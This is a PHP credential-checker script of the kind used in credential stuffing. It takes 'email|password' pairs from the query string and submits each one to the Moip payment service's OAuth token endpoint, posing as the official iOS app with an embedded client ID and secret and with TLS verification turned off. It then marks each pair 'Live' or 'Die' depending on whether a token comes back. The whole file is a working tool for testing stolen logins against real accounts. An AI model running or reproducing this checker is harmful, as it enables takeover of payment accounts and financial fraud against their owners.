<?php

error_reporting(0);

DeletarCookies();

extract($_GET);

function getStr($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

function deletarCookies() {
	if (file_exists("cookie.txt")) {
		unlink("cookie.txt");
	}
}

$separa = explode("|", $lista);
$email = trim($separa[0]);
$senha = trim($separa[1]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://connect.moip.com.br/oauth/token"); 
curl_setopt($ch, CURLOPT_HTTPHEADER, array (
'Accept: /',
'Content-Type: multipart/form-data',
'Host: connect.moip.com.br',
'User-Agent: moip-ios/2.1.1 (br.com.moip.app.moip; build:38; iOS 12.4.2) Alamofire/4.6.0',
)); 
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt'); 
curl_setopt($ch, CURLOPT_POST, 1); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'client_id=APP-SZPO857S0XWD&client_secret=tgi0ruwta5d0t5a1jd7ujkjlp7nj1im&grant_type=password&password='.$senha.'&scope=APP_ADMIN&state=CEBBAC2A-5267-4D93-85DF-C8300620CEBA&username='.$email.'');
$etapa1 = curl_exec($ch);

if (stristr($etapa1,'accessToken') !== false) {
     echo "<b style='font-size:16px;'> <font style='color:yellow;'>$email|$senha|<font style='color: #09FE05 ;'>Live</font></b>";
     
 }

if (stristr($etapa1,'invalid_grant') !== false) {
     echo "<b style='font-size:16px;'> <font style='color:red;'>$email|$senha<font style='color: red ;'>|Die</font></b>";
     
 }

?>